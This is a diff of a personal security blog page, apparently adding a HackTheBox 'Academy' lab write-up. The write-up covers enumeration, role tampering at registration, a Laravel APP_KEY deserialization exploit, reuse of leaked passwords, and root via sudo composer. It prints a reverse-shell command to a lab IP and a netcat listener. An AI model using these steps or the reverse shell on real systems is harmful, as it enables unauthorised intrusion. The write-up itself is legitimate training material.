@@ -33,10 +33,10 @@
   
     
   
-  <meta name="description" content="Welcome to my personal Security blog!" />
+  <meta name="description" content="Here&#39;s my writeup for the RETIRED machine Academy, Which is an easy Linux machine that only require enumarations" />
 
   
-  <link rel="alternate" hreflang="en-us" href="https://mohamed-elleuch.me/writeups/" />
+  <link rel="alternate" hreflang="en-us" href="https://mohamed-elleuch.me/writeups/htb-academy/" />
 
   
 
@@ -276,8 +276,6 @@
   
 
   
-    <link rel="alternate" href="/writeups/index.xml" type="application/rss+xml" title="Mohamed ELLEUCH" />
-  
 
   
     <link rel="manifest" href="/index.webmanifest" />
@@ -286,7 +284,7 @@
   <link rel="icon" type="image/png" href="/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_32x32_fill_lanczos_center_2.png" />
   <link rel="apple-touch-icon" type="image/png" href="/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_180x180_fill_lanczos_center_2.png" />
 
-  <link rel="canonical" href="https://mohamed-elleuch.me/writeups/" />
+  <link rel="canonical" href="https://mohamed-elleuch.me/writeups/htb-academy/" />
 
   
   
@@ -296,20 +294,20 @@
   
   
     
-    
   
   
-  <meta property="twitter:card" content="summary" />
+  <meta property="twitter:card" content="summary_large_image" />
   
   <meta property="og:site_name" content="Mohamed ELLEUCH" />
-  <meta property="og:url" content="https://mohamed-elleuch.me/writeups/" />
-  <meta property="og:title" content="Posts | Mohamed ELLEUCH" />
-  <meta property="og:description" content="Welcome to my personal Security blog!" /><meta property="og:image" content="https://mohamed-elleuch.me/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_512x512_fill_lanczos_center_2.png" />
-    <meta property="twitter:image" content="https://mohamed-elleuch.me/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_512x512_fill_lanczos_center_2.png" /><meta property="og:locale" content="en-us" />
+  <meta property="og:url" content="https://mohamed-elleuch.me/writeups/htb-academy/" />
+  <meta property="og:title" content="HackTheBox - Academy Writeup | Mohamed ELLEUCH" />
+  <meta property="og:description" content="Here&#39;s my writeup for the RETIRED machine Academy, Which is an easy Linux machine that only require enumarations" /><meta property="og:image" content="https://mohamed-elleuch.me/writeups/htb-academy/featured.jpg" />
+    <meta property="twitter:image" content="https://mohamed-elleuch.me/writeups/htb-academy/featured.jpg" /><meta property="og:locale" content="en-us" />
   
     
-      <meta property="og:updated_time" content="2021-03-27T00:00:00&#43;00:00" />
+      <meta property="article:published_time" content="2021-03-27T00:00:00&#43;00:00" />
     
+    <meta property="article:modified_time" content="2021-03-27T00:00:00&#43;00:00">
   
 
   
@@ -320,11 +318,13 @@
 
   
 
+  
 
 
 
 
-  <title>Posts | Mohamed ELLEUCH</title>
+
+  <title>HackTheBox - Academy Writeup | Mohamed ELLEUCH</title>
 </head>
 
 
@@ -588,6 +588,191 @@
   </div>
 
   <div class="page-body">
+    <article class="article">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+<div class="article-container pt-3">
+  <h1>HackTheBox - Academy Writeup</h1>
+
+  
+  <p class="page-subtitle">Here&rsquo;s my writeup for the RETIRED machine Academy, Which is an easy Linux machine!</p>
+  
+
+  
+
+
+<div class="article-metadata">
+
+  
+  
+  
+  
+  <div>
+    
+
+  <span class="author-highlighted">
+      Mohamed Elleuch</span>
+  </div>
+  
+  
+
+  
+  <span class="article-date">
+    
+    
+      
+    
+    Mar 27, 2021
+  </span>
+  
+
+  
+
+  
+
+  
+  
+  
+  
+  
+  
+
+  
+  
+
+</div>
+
+  
+
+
+
+
+
+</div>
+
+
+<div class="article-header container featured-image-wrapper mt-4 mb-4" style="max-width: 594px; max-height: 371px;">
+  <div style="position: relative">
+    <img src="/writeups/htb-academy/featured.jpg" alt="" class="featured-image">
+    <span class="article-header-caption">Image credit: [<strong>HackTheBox</strong>]</span>
+  </div>
+</div>
+
+
+
+  <div class="article-container">
+
+    <div class="article-style">
+      <h1 id="p-stylecolorredinformation-gathering-p"><p style="color:RED">Information Gathering </p></h1>
+<h2 id="p-stylecolorgreennmap-scan-p"><p style="color:Green">Nmap scan </p></h2>
+<pre><code>sudo nmap -sC -sV -T5 -oA nmap -O -A -v 10.10.10.215
+</code></pre>
+<img src="nmap.png">
+As we see we have 2 ports open <br/>
+SSH on port 22 running OpenSSH 8.2p1 <br/>
+http on port 80 running httpd 2.4.41 <br/>
+<p>we notice as well the academy.htb domain, which we should add to /etc/hosts.</p>
+<h2 id="p-stylecolorgreengobuster-scan-p"><p style="color:Green">Gobuster scan </p></h2>
+<pre><code>gobuster dir -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -u http://academy.htb -x php
+</code></pre>
+<img src="gob.png">
+<h1 id="p-stylecolorredinitial-footholdp"><p style="color:RED">Initial Foothold</p></h1>
+<h2 id="p-stylecolorgreenidentifying-the-exploitp"><p style="color:Green">Identifying the exploit</p></h2>
+<p>So basically the first thing that tried was sql injection on <b> admin.php </b> but that didn&rsquo;t give me any results. as we don&rsquo;t have any potential users let&rsquo;s move on and dig further. <br/></p>
+<p>Let&rsquo;s create an account and see if we can find any usernames and intercept it with burp</p>
+<pre><code>POST /register.php HTTP/1.1
+Host: academy.htb
+Content-Length: 53
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://academy.htb
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://academy.htb/register.php
+Accept-Encoding: gzip, deflate
+Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=sdloh07q837vauvt0oqevack4o
+Connection: close
+uid=elleuch&amp;password=elleuch&amp;confirm=elleuch&amp;roleid=0
+</code></pre>
+<p>We can notice the <b>roleid</b>	parameter which is set to 0. we can assume that&rsquo;s assigning a role to the user we&rsquo;re creating. Which basically can be a normal user ( roleid=0 ) or a privileged user ( roleid=1 ).</p>
+<p>Let&rsquo;s change change 0 to 1 and forward the request and create our privileged user and try to login to <b>/admin.php</b></p>
+<img src="planner.png">
+<p>As we see above the planner leaks to us a subdomain <b>dev-staging-01.academy.htb</b> <br/>
+Let&rsquo;s add it to /etc/hosts and see what we get</p>
+<img src="laravel.png">
+<p>Errors! That sounds promosing! Scrolling down we can see something really interesting</p>
+<pre><code>APP_KEY	 &quot;base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=&quot;
+</code></pre>
+<p>We have the APP_KEY! We can abuse <b>Laravel Unserialize Vulnerability CVE-2018-15133 </b> <br/>
+For this exploit we&rsquo;ll be using this script, a pretty easy syntax.</p>
+<pre><code>https://github.com/aljavier/exploit_laravel_cve-2018-15133/blob/main/pwn_laravel.py
+</code></pre>
+<img src="foothold.png">
+<p>And voilà we&rsquo;re on the box</p>
+<h1 id="p-stylecolorreduser-privescp"><p style="color:RED">User Privesc</p></h1>
+<p>Now let&rsquo;s start enumarating,We already know that the webserver is running PHP Laravel. </br>
+The first thing we should look at is the <b>.env</b> file. </br>
+<img src="env.png">
+And we get a password! <br />
+<code>mySup3rP4s5w0rd!!</code> <br/>
+Let&rsquo;s see if it belongs to any existing user
+<img src="users.png">
+After manually trying to switch to these users, it turns out to be cry0l1t3&rsquo;s password
+<img src="logincry.png"></p>
+<p>Our user is in the <b>adm</b> group! So basically we can read logs! And also we can read the audit log! We can grab some juicy informations from it</p>
+<img src="mrb3.png">
+<p><code>data=6D7262336E5F41634064336D79210A</code></p>
+<p>Seems we got a password! But it&rsquo;s hex encoded! Let&rsquo;s decode it</p>
+<img src="pw.png">
+<p><code>mrb3n_Ac@d3my!</code></p>
+<p>Seems like it&rsquo;s mrb3n&rsquo;s password!</p>
+<h1 id="p-stylecolorredroot-privescp"><p style="color:RED">Root Privesc</p></h1>
+<p>Mrb3n can execute <b>/usr/bin/composer</b> as root!</p>
+<img src="sudo.png">
+<p>Going through the docs of composer we can find out that we can execute a custom script using composer! we need to create a composer.json first in any folder we want!</p>
+<pre><code class="language-json">{ 
+&quot;scripts&quot;:{&quot;shell&quot;:&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.111/4444 0&gt;&amp;1'&quot;}
+}
+</code></pre>
+<p>We set our listener</p>
+<pre><code>nc -lvnp 4444 
+</code></pre>
+<p>And execute</p>
+<pre><code>sudo /usr/bin/composer --working-dir=fake run-script shell
+</code></pre>
+<p><img src="root.png" ></p>
+<p>And we rooted the box! <br/>
+<code>uid=0(root) gid=0(root) groups=0(root)</code></p>
+<h2 id="thanks-for-reading-hope-you-enjoyed-it">Thanks for reading hope you enjoyed it!</h2>
+
+    </div>
+
     
 
 
@@ -595,62 +780,228 @@
 
 
 
-
-
-
-
-
-
+<div class="article-tags">
   
-
-  
-  
-  
-    
-  
-<div class="universal-wrapper pt-3">
-  <h1>Posts</h1>
-
-  
-
+  <a class="badge badge-light" href="/tag/hackthebox/">HackTheBox</a>
   
 </div>
 
 
 
-<div class="universal-wrapper">
-  
-
-  
-  
+<div class="share-box" aria-hidden="true">
+  <ul class="share">
     
-    
-    
-    <div>
-      <h2><a href="/writeups/htb-academy/" >HackTheBox - Academy Writeup</a></h2>
-      <div class="article-style">
+      
+      
+      
         
-          Here's my writeup for the RETIRED machine Academy, Which is an easy Linux machine that only require enumarations
-        
-      </div>
-    </div>
-  
+      
+      
+      
+      <li>
+        <a href="https://twitter.com/intent/tweet?url=https://mohamed-elleuch.me/writeups/htb-academy/&amp;text=HackTheBox%20-%20Academy%20Writeup" target="_blank" rel="noopener" class="share-btn-twitter">
+          <i class="fab fa-twitter"></i>
+        </a>
+      </li>
     
-    
-    
-    <div>
-      <h2><a href="/writeups/hacklockad/" >HackLock Active Directory Workshop Writeup</a></h2>
-      <div class="article-style">
+      
+      
+      
         
-          I had the chance to participate in the hacklock event organized by Securinets and also win \o/. Here's the writeup that i presented in front of the jury.
+      
+      
+      
+      <li>
+        <a href="https://www.facebook.com/sharer.php?u=https://mohamed-elleuch.me/writeups/htb-academy/&amp;t=HackTheBox%20-%20Academy%20Writeup" target="_blank" rel="noopener" class="share-btn-facebook">
+          <i class="fab fa-facebook"></i>
+        </a>
+      </li>
+    
+      
+      
+      
         
-      </div>
-    </div>
-  
-
-  
-
+      
+      
+      
+      <li>
+        <a href="mailto:?subject=HackTheBox%20-%20Academy%20Writeup&amp;body=https://mohamed-elleuch.me/writeups/htb-academy/" target="_blank" rel="noopener" class="share-btn-email">
+          <i class="fas fa-envelope"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://www.linkedin.com/shareArticle?url=https://mohamed-elleuch.me/writeups/htb-academy/&amp;title=HackTheBox%20-%20Academy%20Writeup" target="_blank" rel="noopener" class="share-btn-linkedin">
+          <i class="fab fa-linkedin-in"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="whatsapp://send?text=HackTheBox%20-%20Academy%20Writeup%20https://mohamed-elleuch.me/writeups/htb-academy/" target="_blank" rel="noopener" class="share-btn-whatsapp">
+          <i class="fab fa-whatsapp"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://service.weibo.com/share/share.php?url=https://mohamed-elleuch.me/writeups/htb-academy/&amp;title=HackTheBox%20-%20Academy%20Writeup" target="_blank" rel="noopener" class="share-btn-weibo">
+          <i class="fab fa-weibo"></i>
+        </a>
+      </li>
+    
+  </ul>
 </div>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+
+
+
+  
+  
+  
+    
+  
+  
+  
+  <div class="media author-card content-widget-hr">
+    
+      
+      <a href="https://mohamed-elleuch.me"><img class="avatar mr-3 avatar-circle" src="/authors/admin/avatar_hue00c9bb654a77b295a35ed11380f9182_580950_270x270_fill_q75_lanczos_center.jpg" alt="Mohamed Elleuch"></a>
+    
+
+    <div class="media-body">
+      <h5 class="card-title"><a href="https://mohamed-elleuch.me">Mohamed Elleuch</a></h5>
+      <h6 class="card-subtitle">Cyber Security Enthusiast <br/> ICT Engineering Student</h6>
+      <p class="card-text">Pentester and Red Teamer</p>
+      <ul class="network-icon" aria-hidden="true">
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="/#contact" >
+        <i class="fas fa-envelope"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://twitter.com/medelleuchv1" target="_blank" rel="noopener">
+        <i class="fab fa-twitter"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://github.com/ElleuchX1" target="_blank" rel="noopener">
+        <i class="fab fa-github"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://www.linkedin.com/in/medelleuch" target="_blank" rel="noopener">
+        <i class="fab fa-linkedin"></i>
+      </a>
+    </li>
+  
+</ul>
+
+    </div>
+  </div>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  </div>
+</article>
   </div>
 
   <div class="page-footer">
